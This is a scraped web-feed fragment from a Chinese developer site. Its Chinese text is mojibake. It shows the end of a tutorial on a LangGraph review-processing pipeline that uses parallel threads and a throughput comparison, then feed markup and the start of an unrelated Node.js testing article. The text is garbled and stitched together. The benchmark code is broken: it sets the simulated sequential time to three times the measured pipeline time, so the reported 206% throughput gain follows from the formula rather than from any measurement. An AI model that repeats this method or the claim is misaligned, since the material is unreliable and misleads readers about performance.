<p>ç°åœ¨ï¼Œä¸ºè£…é…çº¿ä¸Šçš„æ¯ä¸ªå·¥ä½œç«™å®šä¹‰èŠ‚ç‚¹ï¼Œå…³é”®å®ç°ç»†èŠ‚æ˜¯æ¯ä¸ªèŠ‚ç‚¹ä½¿ç”¨ <code>ThreadPoolExecutor</code> æ¥å¹¶è¡Œå¤„ç†åˆ†é…ç»™å…¶é˜¶æ®µçš„æ‰€æœ‰é¡¹ç›®ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm

MAX_WORKERS = <span class="hljs-number">4</span> <span class="hljs-comment"># æ§åˆ¶æ¯ä¸ªå·¥ä½œç«™çš„å¹¶è¡Œåº¦</span>

<span class="hljs-comment"># å·¥ä½œç«™ 1: åˆ†æµèŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">triage_node</span>(<span class="hljs-params">state: PipelineState</span>):
    <span class="hljs-string">"""ç¬¬ 1 ç«™ï¼šå¹¶è¡Œçš„å¯¹æ‰€æœ‰åˆå§‹è¯„è®ºè¿›è¡Œåˆ†ç±»"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"--- [Station 1: Triage] Processing <span class="hljs-subst">{<span class="hljs-built_in">len</span>(state[<span class="hljs-string">'initial_reviews'</span>])}</span> reviews... ---"</span>)
    start_time = time.time()
    
    triaged_reviews = []
    <span class="hljs-comment"># ç”¨ ThreadPoolExecutor å¯¹æ¯ä¸ªè¯„è®ºè¿›è¡Œå¹¶è¡Œ LLM è°ƒç”¨</span>
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=MAX_WORKERS) <span class="hljs-keyword">as</span> executor:
        <span class="hljs-comment"># We create a future for each review to be triaged.</span>
        future_to_review = {executor.submit(triage_chain.invoke, {<span class="hljs-string">"review_text"</span>: review}): review <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> state[<span class="hljs-string">'initial_reviews'</span>]}
        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> tqdm(as_completed(future_to_review), total=<span class="hljs-built_in">len</span>(state[<span class="hljs-string">'initial_reviews'</span>]), desc=<span class="hljs-string">"Triage Progress"</span>):
            original_review = future_to_review[future]
            <span class="hljs-keyword">try</span>:
                result = future.result()
                <span class="hljs-comment"># åˆ›å»ºåˆå§‹ ProcessedReview å¯¹è±¡</span>
                triaged_reviews.append(ProcessedReview(original_review=original_review, category=result.category))
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Review generated an exception: <span class="hljs-subst">{exc}</span>'</span>)
    
    execution_time = time.time() - start_time
    log = <span class="hljs-string">f"[Triage] Processed <span class="hljs-subst">{<span class="hljs-built_in">len</span>(state[<span class="hljs-string">'initial_reviews'</span>])}</span> reviews in <span class="hljs-subst">{execution_time:<span class="hljs-number">.2</span>f}</span>s."</span>
    <span class="hljs-built_in">print</span>(log)
    
    <span class="hljs-comment"># è¯¥èŠ‚ç‚¹çš„è¾“å‡ºæ˜¯å·²å¤„ç†è¯„è®ºçš„åˆå§‹åˆ—è¡¨</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed_reviews"</span>: triaged_reviews, <span class="hljs-string">"performance_log"</span>: [log]}
</code></pre>
<p><code>triage_node</code> æ˜¯è£…é…çº¿å…¥å£ï¼Œå…³é”®è®¾è®¡ç‚¹æ˜¯ä½¿ç”¨ <code>ThreadPoolExecutor</code>ã€‚</p>
<p><code>triage_node</code> ä¸€æ¬¡æ€§å°†æ‰€æœ‰è¯„è®ºæäº¤ç»™ <code>triage_chain</code>ï¼Œç„¶å <code>as_completed</code> è¿­ä»£å™¨åœ¨å®Œæˆæ—¶ç”Ÿæˆç»“æœï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿé«˜æ•ˆæ„å»º <code>triaged_reviews</code> åˆ—è¡¨ï¼Œç¡®ä¿è¯¥ç«™ç‚¹çš„è€—æ—¶ç”±æœ€æ…¢çš„å‡ ä¸ª LLM è°ƒç”¨å†³å®šï¼Œè€Œä¸æ˜¯æ‰€æœ‰è°ƒç”¨çš„æ€»å’Œã€‚</p>
<p>åç»­èŠ‚ç‚¹ <code>summarize_node</code> å’Œ <code>extract_data_node</code> éµå¾ªç›¸åŒçš„å¹¶è¡Œå¤„ç†æ¨¡å¼ï¼Œé¦–å…ˆç­›é€‰å‡ºè‡ªå·±è´Ÿè´£çš„é¡¹ç›®ï¼Œç„¶åå¹¶è¡Œå¤„ç†ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å·¥ä½œç«™ 2: æ€»ç»“èŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">summarize_node</span>(<span class="hljs-params">state: PipelineState</span>):
    <span class="hljs-string">"""ç¬¬ 2 ç«™ï¼šè¿‡æ»¤åé¦ˆè¯„è®ºå¹¶å¹¶è¡Œæ€»ç»“"""</span>
    <span class="hljs-comment"># æœ¬ç«™åªæä¾›â€œåé¦ˆâ€ç±»è¯„è®º</span>
    feedback_reviews = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> state[<span class="hljs-string">'processed_reviews'</span>] <span class="hljs-keyword">if</span> r.category == <span class="hljs-string">"Feedback"</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> feedback_reviews:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"--- [Station 2: Summarizer] No feedback reviews to process. Skipping. ---"</span>)
        <span class="hljs-keyword">return</span> {}
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"--- [Station 2: Summarizer] Processing <span class="hljs-subst">{<span class="hljs-built_in">len</span>(feedback_reviews)}</span> feedback reviews... ---"</span>)
    start_time = time.time()
    
    <span class="hljs-comment"># ç”¨ map æ¥æ–¹ä¾¿çš„æ›´æ–°è¯„è®º</span>
    review_map = {r.original_review: r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> state[<span class="hljs-string">'processed_reviews'</span>]}
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=MAX_WORKERS) <span class="hljs-keyword">as</span> executor:
        future_to_review = {executor.submit(summarizer_chain.invoke, {<span class="hljs-string">"review_text"</span>: r.original_review}): r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> feedback_reviews}
        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> tqdm(as_completed(future_to_review), total=<span class="hljs-built_in">len</span>(feedback_reviews), desc=<span class="hljs-string">"Summarizer Progress"</span>):
            original_review_obj = future_to_review[future]
            <span class="hljs-keyword">try</span>:
                result = future.result()
                <span class="hljs-comment"># åœ¨ map ä¸­æ‰¾åˆ°åŸå§‹è¯„è®ºå¯¹è±¡ï¼Œå¹¶ç”¨æ‘˜è¦æ¥å……å®</span>
                review_map[original_review_obj.original_review].summary = result.summary
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Review generated an exception: <span class="hljs-subst">{exc}</span>'</span>)
    
    execution_time = time.time() - start_time
    log = <span class="hljs-string">f"[Summarizer] Processed <span class="hljs-subst">{<span class="hljs-built_in">len</span>(feedback_reviews)}</span> reviews in <span class="hljs-subst">{execution_time:<span class="hljs-number">.2</span>f}</span>s."</span>
    <span class="hljs-built_in">print</span>(log)
    
    <span class="hljs-comment"># è¿”å›å®Œæ•´çš„ã€æ›´æ–°çš„è¯„è®ºåˆ—è¡¨</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed_reviews"</span>: <span class="hljs-built_in">list</span>(review_map.values()), <span class="hljs-string">"performance_log"</span>: [log]}
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å·¥ä½œç«™ 3: æ•°æ®æå–èŠ‚ç‚¹</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data_node</span>(<span class="hljs-params">state: PipelineState</span>):
    <span class="hljs-string">"""æœ€åä¸€ç«™ï¼šå¹¶è¡Œçš„ä»æ€»ç»“è¯„è®ºä¸­æå–ç»“æ„åŒ–æ•°æ®"""</span>
    <span class="hljs-comment"># è¿™ä¸ªç«™ç‚¹åªæ“ä½œå¸¦æ‘˜è¦çš„è¯„è®º</span>
    summarized_reviews = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> state[<span class="hljs-string">'processed_reviews'</span>] <span class="hljs-keyword">if</span> r.summary <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> summarized_reviews:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"--- [Station 3: Extractor] No summarized reviews to process. Skipping. ---"</span>)
        <span class="hljs-keyword">return</span> {}
        
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"--- [Station 3: Extractor] Processing <span class="hljs-subst">{<span class="hljs-built_in">len</span>(summarized_reviews)}</span> summarized reviews... ---"</span>)
    start_time = time.time()
    
    review_map = {r.original_review: r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> state[<span class="hljs-string">'processed_reviews'</span>]}
    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=MAX_WORKERS) <span class="hljs-keyword">as</span> executor:
        future_to_review = {executor.submit(extractor_chain.invoke, {<span class="hljs-string">"summary_text"</span>: r.summary}): r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> summarized_reviews}
        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> tqdm(as_completed(future_to_review), total=<span class="hljs-built_in">len</span>(summarized_reviews), desc=<span class="hljs-string">"Extractor Progress"</span>):
            original_review_obj = future_to_review[future]
            <span class="hljs-keyword">try</span>:
                result = future.result()
                <span class="hljs-comment"># æœ€åä¸€æ¬¡ç”¨æå–çš„æ•°æ®ä¸°å¯Œè¯„è®ºå¯¹è±¡</span>
                review_map[original_review_obj.original_review].extracted_data = result
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Review generated an exception: <span class="hljs-subst">{exc}</span>'</span>)
    
    execution_time = time.time() - start_time
    log = <span class="hljs-string">f"[Extractor] Processed <span class="hljs-subst">{<span class="hljs-built_in">len</span>(summarized_reviews)}</span> reviews in <span class="hljs-subst">{execution_time:<span class="hljs-number">.2</span>f}</span>s."</span>
    <span class="hljs-built_in">print</span>(log)
    
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"processed_reviews"</span>: <span class="hljs-built_in">list</span>(review_map.values()), <span class="hljs-string">"performance_log"</span>: [log]}
</code></pre>
<p>è¿™äº›èŠ‚ç‚¹åŒ…å«è£…é…çº¿è¿‡æ»¤é€»è¾‘ï¼Œ<code>summarize_node</code> å¹¶ä¸å¤„ç†æ‰€æœ‰è¯„è®ºï¼Œåªä»æµæ°´çº¿ä¸Šæ‹‰å–"åé¦ˆ"é¡¹ï¼Œ<code>extract_data_node</code> åªå¤„ç†é‚£äº›å·²ç»è¢«æˆåŠŸæ€»ç»“çš„é¡¹ï¼Œä¸“ä¸šåŒ–æ˜¯è¯¥æ¨¡å¼çš„å…³é”®ç‰¹æ€§ã€‚</p>
<p>æ¥ä¸‹æ¥å¯ä»¥ç»„è£…çº¿æ€§å›¾â€¦â€¦</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, END

<span class="hljs-comment"># åˆå§‹åŒ–å›¾</span>
workflow = StateGraph(PipelineState)

<span class="hljs-comment"># å°†ä¸‰ä¸ªå·¥ä½œç«™æ·»åŠ ä¸ºèŠ‚ç‚¹</span>
workflow.add_node(<span class="hljs-string">"triage"</span>, triage_node)
workflow.add_node(<span class="hljs-string">"summarize"</span>, summarize_node)
workflow.add_node(<span class="hljs-string">"extract_data"</span>, extract_data_node)

<span class="hljs-comment"># å®šä¹‰è£…é…çº¿çš„çº¿æ€§æµ</span>
workflow.set_entry_point(<span class="hljs-string">"triage"</span>)
workflow.add_edge(<span class="hljs-string">"triage"</span>, <span class="hljs-string">"summarize"</span>)
workflow.add_edge(<span class="hljs-string">"summarize"</span>, <span class="hljs-string">"extract_data"</span>)
workflow.add_edge(<span class="hljs-string">"extract_data"</span>, END)

<span class="hljs-comment"># ç¼–è¯‘å›¾</span>
app = workflow.<span class="hljs-built_in">compile</span>()
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08e5eaa7478649e9b816e0dfe5fe22ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768456810&amp;x-signature=IIiOAG6ef9eGs0zLNvASed1v0ko%3D" alt="è£…é…çº¿" loading="lazy"/></p>
<p>ç°åœ¨è¿›è¡Œæœ€ç»ˆå…³é”®åˆ†æï¼Œæ¯”è¾ƒè£…é…çº¿ä¸æ¨¡æ‹Ÿå•ä¸€ä»£ç†å¤„ç†è¯„è®ºçš„æ€§èƒ½ï¼Œä»¥é‡åŒ–ååé‡çš„å·¨å¤§æå‡ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æµæ°´çº¿å·¥ä½œæµç¨‹çš„æ€»æ—¶é—´æ˜¯æ¯ä¸ªé˜¶æ®µå¤„ç†æ•´ä¸ªæ‰¹çš„æ—¶é—´æ€»å’Œ</span>
pipelined_total_time = triage_time + summarize_time + extract_time

<span class="hljs-comment"># ååé‡æ˜¯å¤„ç†çš„æ€»ä»¶æ•°é™¤ä»¥æ€»æ—¶é—´</span>
pipelined_throughput = num_reviews / pipelined_total_time

<span class="hljs-comment"># ç°åœ¨æ¨¡æ‹Ÿé¡ºåºçš„å•ä¸€ä»£ç†</span>
<span class="hljs-comment"># é¦–å…ˆï¼Œä¼°ç®—ä¸€æ¬¡è¯„è®ºé€šè¿‡ä¸€ä¸ªé˜¶æ®µæ‰€éœ€çš„å¹³å‡æ—¶é—´</span>
avg_time_per_stage_per_review = (triage_time + summarize_time + extract_time) / num_reviews

<span class="hljs-comment"># å•ä¸ªè¯„è®ºä»å¼€å§‹åˆ°ç»“æŸçš„æ€»æ—¶å»¶æ˜¯ä¸‰ä¸ªé˜¶æ®µçš„æ—¶é—´æ€»å’Œ</span>
total_latency_per_review = avg_time_per_stage_per_review * <span class="hljs-number">3</span>

<span class="hljs-comment"># é¡ºåºä»£ç†å¤„ç† 10 æ¡è¯„è®ºçš„æ€»æ—¶é—´æ˜¯ 1 æ¡è¯„è®ºæ—¶å»¶çš„ 10 å€</span>
sequential_total_time = total_latency_per_review * num_reviews
sequential_throughput = num_reviews / sequential_total_time

<span class="hljs-comment"># è®¡ç®—ååé‡å¢åŠ ç™¾åˆ†æ¯”</span>
throughput_increase = ((pipelined_throughput - sequential_throughput) / sequential_throughput) * <span class="hljs-number">100</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"                      PERFORMANCE ANALYSIS"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n--- Assembly Line (Pipelined) Workflow ---"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Total Time to Process <span class="hljs-subst">{num_reviews}</span> Reviews: <span class="hljs-subst">{pipelined_total_time:<span class="hljs-number">.2</span>f}</span> seconds"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Calculated Throughput: <span class="hljs-subst">{pipelined_throughput:<span class="hljs-number">.2</span>f}</span> reviews/second\n"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"--- Monolithic (Sequential) Workflow (Simulated) ---"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Avg. Latency For One Review to Complete All Stages: <span class="hljs-subst">{total_latency_per_review:<span class="hljs-number">.2</span>f}</span> seconds"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Simulated Total Time to Process <span class="hljs-subst">{num_reviews}</span> Reviews: <span class="hljs-subst">{sequential_total_time:<span class="hljs-number">.2</span>f}</span> seconds"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Simulated Throughput: <span class="hljs-subst">{sequential_throughput:<span class="hljs-number">.2</span>f}</span> reviews/second\n"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"                        CONCLUSION"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Throughput Increase: <span class="hljs-subst">{throughput_increase:<span class="hljs-number">.0</span>f}</span>%"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#### è¾“å‡º ####</span>
============================================================
                      PERFORMANCE ANALYSIS
============================================================

--- Assembly Line (Pipelined) Workflow ---
Total Time to Process <span class="hljs-number">10</span> Reviews: <span class="hljs-number">20.40</span> seconds
Calculated Throughput: <span class="hljs-number">0.49</span> reviews/second

--- Monolithic (Sequential) Workflow (Simulated) ---
Avg. Latency For One Review to Complete All Stages: <span class="hljs-number">6.12</span> seconds
Simulated Total Time to Process <span class="hljs-number">10</span> Reviews: <span class="hljs-number">61.20</span> seconds
Simulated Throughput: <span class="hljs-number">0.16</span> reviews/second

============================================================
                        CONCLUSION
============================================================
Throughput Increase: <span class="hljs-number">206</span>%
</code></pre>
<p>åˆ†ææ¸…æ¥šè¡¨æ˜ï¼Œè£…é…çº¿æ¨¡å¼å…·æœ‰å¼ºå¤§çš„èƒ½åŠ›ã€‚è™½ç„¶ä»å¼€å§‹åˆ°ç»“æŸå¤„ç†å•ä¸ªè¯„è®ºçš„æ—¶é—´ï¼ˆæ—¶å»¶ï¼‰çº¦ä¸º 6s ï¼Œä½†æµæ°´çº¿ç³»ç»Ÿåœ¨ 20 å¤šç§’å†…å°±å¤„ç†äº†å…¨éƒ¨ 10 æ‰¹æ•°æ®ã€‚</p>
<p>è€Œä¼ ç»Ÿçš„å•ä¸€ä»£ç†é€ä¸€å¤„ç†ï¼Œå°†éœ€è¦è¶…è¿‡ 60sã€‚è£…é…çº¿çš„ååé‡æ˜¯å…¶ä¸‰å€ï¼Œè¿™æ˜¯å› ä¸ºå½“æå–å™¨å¤„ç†ç¬¬ä¸€ä»½è¯„è®ºæ—¶ï¼Œæ€»ç»“å™¨æ­£åœ¨å¤„ç†ç¬¬äºŒä»½ï¼Œè€Œåˆ†å‘å™¨ä»£ç†å·²ç»å¤„ç†ç¬¬ä¸‰ä»½äº†ã€‚</p>
<p>è¿™ç§å¹¶è¡Œã€æµæ°´çº¿çš„æ‰§è¡Œæ˜¯æ„å»ºå…·æœ‰ AI ä»£ç†çš„é«˜ååé‡æ•°æ®å¤„ç†ç³»ç»Ÿçš„å…³é”®ã€‚</p>
<hr/>
<blockquote>
<p>Hiï¼Œæˆ‘æ˜¯ä¿å‡¡ï¼Œä¸€åå…¼å…·æŠ€æœ¯æ·±åº¦ä¸ç®¡ç†è§†é‡çš„æŠ€æœ¯ç®¡ç†è€…ã€‚æ›¾å°±èŒäº Motorolaï¼Œç°ä»»èŒäº Mavenirï¼Œå¤šå¹´å¸¦é¢†æŠ€æœ¯å›¢é˜Ÿï¼Œèšç„¦åç«¯æ¶æ„ä¸äº‘åŸç”Ÿï¼ŒæŒç»­å…³æ³¨ AI ç­‰å‰æ²¿æ–¹å‘ï¼Œä¹Ÿå…³æ³¨äººçš„æˆé•¿ï¼Œç¬ƒä¿¡æŒç»­å­¦ä¹ çš„åŠ›é‡ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä¼šåˆ†äº«æŠ€æœ¯å®è·µä¸æ€è€ƒã€‚æ¬¢è¿å…³æ³¨å…¬ä¼—å·ã€ŒDeepNoMindã€ï¼Œæ˜Ÿæ ‡ä¸è¿·è·¯ã€‚ä¹Ÿæ¬¢è¿è®¿é—®ç‹¬ç«‹ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.deepnomind.com" title="https://www.deepnomind.com" target="_blank" ref="nofollow noopener noreferrer">www.DeepNoMind.com</a>ï¼Œä¸€èµ·äº¤æµæˆé•¿ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šæµ‹è¯•ä¸è°ƒè¯• - å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•]]></title>    <link>https://juejin.cn/post/7592582130594857011</link>    <guid>https://juejin.cn/post/7592582130594857011</guid>    <pubDate>2026-01-08T04:06:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130594857011" data-draft-id="7592582130594840627" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šæµ‹è¯•ä¸è°ƒè¯• - å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-01-08T04:06:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šæµ‹è¯•ä¸è°ƒè¯• - å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T04:06:58.000Z" title="Thu Jan 08 2026 04:06:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨ç°ä»£ Node.js é¡¹ç›®ä¸­ï¼Œæµ‹è¯•ä¸è°ƒè¯•æ˜¯ä¿è¯ä»£ç è´¨é‡å’Œç¨³å®šæ€§çš„é‡è¦ç¯èŠ‚ã€‚é€šè¿‡å•å…ƒæµ‹è¯•å’Œé›†æˆæµ‹è¯•ï¼Œå¯ä»¥åœ¨å¼€å‘æ—©æœŸå‘ç°é—®é¢˜ï¼Œå‡å°‘ç”Ÿäº§ç¯å¢ƒçš„ bugï¼Œæé«˜åº”ç”¨çš„å¯é æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†è¯¦ç»†ä»‹ç» Node.js ä¸­çš„å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•ï¼ŒåŒ…æ‹¬åŸºæœ¬æ¦‚å¿µã€å¸¸ç”¨å·¥å…·å’Œå®è·µæ–¹æ³•ã€‚</p>
<hr/>
